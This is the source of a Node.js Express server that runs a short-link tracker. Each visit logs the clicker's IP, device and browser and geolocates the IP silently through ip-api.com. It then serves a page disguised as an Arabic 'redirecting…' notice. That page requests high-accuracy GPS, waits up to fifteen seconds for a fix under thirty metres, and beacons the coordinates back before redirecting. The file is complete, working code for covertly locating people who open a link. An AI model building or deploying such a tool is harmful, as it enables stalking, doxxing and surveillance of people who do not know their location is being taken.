const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const express = require('express');
const UAParser = require('ua-parser-js');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

// --- Tiny JSON-file store (sync writes; fine for low-volume) ----------------
function loadStore() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return {
      links: Array.isArray(parsed.links) ? parsed.links : [],
      visits: Array.isArray(parsed.visits) ? parsed.visits : [],
      nextVisitId: Number(parsed.nextVisitId) || 1,
    };
  } catch {
    return { links: [], visits: [], nextVisitId: 1 };
  }
}
const store = loadStore();
let saveTimer = null;
function save() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    const tmp = DATA_FILE + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(store, null, 2));
    fs.renameSync(tmp, DATA_FILE);
  }, 50);
}

function makeId(len = 8) {
  return crypto.randomBytes(Math.ceil(len * 0.75)).toString('base64url').slice(0, len);
}

// --- App setup --------------------------------------------------------------
app.set('trust proxy', true);
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function getClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return String(xff).split(',')[0].trim();
  const ip = req.ip || req.connection?.remoteAddress || '';
  return ip.replace('::ffff:', '');
}

function normalizeUrl(input) {
  const trimmed = String(input || '').trim();
  if (!trimmed) return null;
  if (/^https?:\/\//i.test(trimmed)) return trimmed;
  return 'https://' + trimmed;
}

function isPrivateIp(ip) {
  if (!ip) return true;
  return /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|fc|fd|fe80)/i.test(ip);
}

// --- Silent server-side IP geolocation --------------------------------------
// Uses ip-api.com (free, no key, ~45 req/min). City-level accuracy.
// Caches per-IP for 24h to stay within quota.
const geoCache = new Map(); // ip -> { at, data }
const GEO_TTL = 24 * 60 * 60 * 1000;

// Server's own public IP (resolved once, used as fallback for local testing)
let serverPublicIp = null;
async function getServerPublicIp() {
  if (serverPublicIp) return serverPublicIp;
  try {
    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2500) });
    const j = await r.json();
    if (j.ip) serverPublicIp = j.ip;
  } catch { /* ignore */ }
  return serverPublicIp;
}

async function lookupGeo(ip) {
  if (!ip || isPrivateIp(ip)) {
    const pub = await getServerPublicIp();
    if (!pub) return { status: 'private' };
    const data = await lookupGeo(pub);
    return { ...data, status: data.status === 'ok' ? 'ok (server-ip)' : data.status };
  }
  const cached = geoCache.get(ip);
  if (cached && Date.now() - cached.at < GEO_TTL) return cached.data;
  try {
    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,lat,lon,isp,query`;
    const r = await fetch(url, { signal: AbortSignal.timeout(2500) });
    const j = await r.json();
    if (j.status !== 'success') {
      const data = { status: 'fail' };
      geoCache.set(ip, { at: Date.now(), data });
      return data;
    }
    const data = {
      status: 'ok',
      country: j.country || null,
      region: j.regionName || null,
      city: j.city || null,
      latitude: typeof j.lat === 'number' ? j.lat : null,
      longitude: typeof j.lon === 'number' ? j.lon : null,
      isp: j.isp || null,
    };
    geoCache.set(ip, { at: Date.now(), data });
    return data;
  } catch (e) {
    return { status: 'error', error: String(e.message || e) };
  }
}

// --- API: links -------------------------------------------------------------
app.post('/api/links', (req, res) => {
  const { title, url } = req.body || {};
  const cleanTitle = String(title || '').trim();
  const cleanUrl = normalizeUrl(url);
  if (!cleanTitle) return res.status(400).json({ error: 'Title is required' });
  if (!cleanUrl) return res.status(400).json({ error: 'URL is required' });
  try { new URL(cleanUrl); } catch { return res.status(400).json({ error: 'Invalid URL' }); }

  const id = makeId(8);
  const now = Date.now();
  const link = { id, title: cleanTitle, target_url: cleanUrl, created_at: now };
  store.links.unshift(link);
  save();

  const host = req.get('host');
  const proto = req.protocol;
  res.json({ ...link, short_url: `${proto}://${host}/r/${id}` });
});

app.get('/api/links', (req, res) => {
  const host = req.get('host');
  const proto = req.protocol;
  const out = store.links.map(l => {
    const visits = store.visits.filter(v => v.link_id === l.id);
    const last = visits.reduce((m, v) => v.visited_at > m ? v.visited_at : m, 0);
    return {
      ...l,
      short_url: `${proto}://${host}/r/${l.id}`,
      visit_count: visits.length,
      last_visit: last || null,
    };
  });
  res.json(out);
});

app.delete('/api/links/:id', (req, res) => {
  const { id } = req.params;
  const before = store.links.length;
  store.links = store.links.filter(l => l.id !== id);
  store.visits = store.visits.filter(v => v.link_id !== id);
  save();
  res.json({ deleted: store.links.length < before });
});

// --- API: visits ------------------------------------------------------------
app.get('/api/visits', (req, res) => {
  const linkId = req.query.link_id;
  const byId = Object.fromEntries(store.links.map(l => [l.id, l]));
  let list = store.visits;
  if (linkId) list = list.filter(v => v.link_id === linkId);
  const out = [...list]
    .sort((a, b) => b.visited_at - a.visited_at)
    .slice(0, 500)
    .map(v => {
      const link = byId[v.link_id] || {};
      return { ...v, title: link.title || '(deleted)', target_url: link.target_url || '#' };
    });
  res.json(out);
});

// Update a visit with precise GPS coords (called from the tracking page).
app.post('/api/visits/:visitId/location', (req, res) => {
  const visitId = Number(req.params.visitId);
  const { latitude, longitude, accuracy } = req.body || {};
  if (!Number.isFinite(visitId)) return res.status(400).json({ error: 'Bad visit id' });
  const visit = store.visits.find(v => v.id === visitId);
  if (!visit) return res.status(404).json({ error: 'Not found' });

  if (Number.isFinite(latitude) && Number.isFinite(longitude)) {
    visit.latitude = Number(latitude);
    visit.longitude = Number(longitude);
    visit.accuracy = Number.isFinite(accuracy) ? Number(accuracy) : null;
    visit.geo_status = 'gps';
    save();
  }
  res.json({ ok: true });
});

// --- /r/:id: log the visit, ask for precise GPS, then redirect -------------
app.get('/r/:id', async (req, res) => {
  const { id } = req.params;
  const link = store.links.find(l => l.id === id);
  if (!link) return res.status(404).send('Link not found');

  const ua = req.get('user-agent') || '';
  const parsed = new UAParser(ua).getResult();
  const deviceType = parsed.device.type
    || (/mobile/i.test(ua) ? 'mobile' : 'desktop');
  const ip = getClientIp(req);

  // Insert the visit immediately so we have an id to update with GPS coords later.
  const geo = await lookupGeo(ip);
  const visit = {
    id: store.nextVisitId++,
    link_id: id,
    ip,
    device_type: deviceType,
    os: [parsed.os.name, parsed.os.version].filter(Boolean).join(' ') || null,
    browser: [parsed.browser.name, parsed.browser.version].filter(Boolean).join(' ') || null,
    user_agent: ua,
    country: geo.country || null,
    region: geo.region || null,
    city: geo.city || null,
    latitude: geo.latitude ?? null,
    longitude: geo.longitude ?? null,
    accuracy: null,
    isp: geo.isp || null,
    geo_status: geo.status,
    visited_at: Date.now(),
  };
  store.visits.push(visit);
  save();

  const target = link.target_url;
  const safeTitle = String(link.title).replace(/</g, '&lt;');
  res.set('Cache-Control', 'no-store');
  res.send(`<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>${safeTitle}</title>
<style>
  html,body{margin:0;height:100%;background:#0f172a;color:#e2e8f0;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
  .box{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:22px;max-width:420px;text-align:center}
  h1{margin:0 0 6px;font-size:18px}
  p{margin:6px 0;color:#94a3b8;font-size:13px}
  .spin{width:30px;height:30px;border:3px solid #334155;border-top-color:#38bdf8;border-radius:50%;margin:12px auto;animation:s .8s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  a{color:#38bdf8}
</style>
</head>
<body>
  <div class="wrap"><div class="box">
    <h1>جاري التحويل…</h1>
    <div class="spin"></div>
    <a href="${target.replace(/"/g, '&quot;')}">اضغط هنا لو ما اتحولتش</a>
  </div></div>
<script>
(function(){
  var visitId=${JSON.stringify(String(visit.id))};
  var target=${JSON.stringify(target)};
  var done=false;
  function send(payload,cb){
    try{
      var url='/api/visits/'+encodeURIComponent(visitId)+'/location';
      var body=JSON.stringify(payload);
      if(navigator.sendBeacon){
        navigator.sendBeacon(url,new Blob([body],{type:'application/json'}));
        cb&&cb();
      }else{
        fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:body,keepalive:true}).finally(function(){cb&&cb();});
      }
    }catch(e){cb&&cb();}
  }
  function go(){if(done)return;done=true;window.location.replace(target);}
  if(!('geolocation' in navigator)){setTimeout(go,200);return;}

  // Hard fallback: redirect after 18s no matter what.
  setTimeout(go, 18000);

  var best=null, watchId=null;
  function finish(){
    if(best){
      send({latitude:best.coords.latitude,longitude:best.coords.longitude,accuracy:best.coords.accuracy},function(){setTimeout(go,200);});
    } else {
      setTimeout(go,150);
    }
  }
  // Stop watching after 15s and send the best fix we have.
  setTimeout(function(){ try{navigator.geolocation.clearWatch(watchId);}catch(e){} finish(); }, 15000);

  watchId = navigator.geolocation.watchPosition(
    function(pos){
      if(!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
      // If we already got a good fix (< 30m), stop early.
      if(pos.coords.accuracy && pos.coords.accuracy < 30){
        try{navigator.geolocation.clearWatch(watchId);}catch(e){}
        finish();
      }
    },
    function(err){
      // Permission denied -> redirect quickly; other errors -> wait for the 15s timer.
      if(err && err.code===1){ try{navigator.geolocation.clearWatch(watchId);}catch(e){} setTimeout(go,150); }
    },
    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
  );
})();
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log(`Link tracker running on http://localhost:${PORT}`);
});
